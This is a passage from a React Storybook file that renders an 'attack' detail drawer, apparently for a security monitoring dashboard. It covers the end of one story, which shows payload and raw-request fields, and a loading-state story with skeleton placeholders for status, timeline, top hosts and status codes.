                        </Attribute>
                        <Attribute orientation='horizontal'>
                          <AttributeLabel>Payload</AttributeLabel>
                          <AttributeValue>
                            <InlineCodeSnippet code={request.payload} size='sm' />
                          </AttributeValue>
                        </Attribute>
                      </div>
                      <div className='px-24 py-4'>
                        <Separator />
                      </div>
                      <div className='px-24 py-8'>
                        <Text size='md'>Full request</Text>
                      </div>
                      <div className='px-24 pb-16'>
                        <CodeSnippetRoot code={request.raw} language='text' maxLines={15} wrapLines>
                          <CodeSnippetContent>
                            <CodeSnippetLineNumbers />
                            <CodeSnippetCode />
                          </CodeSnippetContent>
                        </CodeSnippetRoot>
                      </div>
                    </ScrollAreaContent>
                  </ScrollAreaViewport>
                  <ScrollAreaScrollbar />
                </ScrollArea>
              )}
            </div>
          </div>
        </div>
      </DrawerContent>
    </Drawer>
  );
};

/**
 * Still loading: attributes show their skeletons and every card keeps its title over a skeleton of
 * its own shape. No `Loader` over the body.
 */
export const Loading: StoryFn = () => (
  <Drawer width={1064} data-testid='attack-drawer'>
    <DrawerTrigger asChild>
      <Button variant='outline' color='neutral'>
        View attack
      </Button>
    </DrawerTrigger>
    <DrawerContent>
      <DrawerHeader>
        <Heading as='h2' size='xl' weight='medium' truncate>
          {RCE.name}
        </Heading>
      </DrawerHeader>
      <DrawerBody>
        <VStack gap={12} className='py-16' data-testid='attack-loading'>
          <div className='grid grid-cols-2 gap-x-8 gap-y-16 rounded-8 border border-border-primary-light p-16'>
            <Attribute loading>
              <AttributeLabel>Status</AttributeLabel>
              <AttributeValue />
            </Attribute>
            <Attribute loading>
              <AttributeLabel>First seen</AttributeLabel>
              <AttributeValue />
            </Attribute>
            <Attribute loading>
              <AttributeLabel>Attack type</AttributeLabel>
              <AttributeValue />
            </Attribute>
            <Attribute loading>
              <AttributeLabel>Last seen</AttributeLabel>
              <AttributeValue />
            </Attribute>
          </div>
          <Chart>
            <ChartHeader>
              <ChartTitle>Timeline</ChartTitle>
            </ChartHeader>
            <LineChartEmpty />
          </Chart>
          <div className='grid grid-cols-2 gap-12'>
            <Chart>
              <ChartHeader>
                <ChartTitle>Top 5 hosts</ChartTitle>
              </ChartHeader>
              <BarListSkeleton rows={3} />
            </Chart>
            <Chart>
              <ChartHeader>
                <ChartTitle>Status codes</ChartTitle>
              </ChartHeader>
              <PieChartSkeleton rows={3} />
            </Chart>
          </div>
        </VStack>
      </DrawerBody>
    </DrawerContent>
  </Drawer>
);
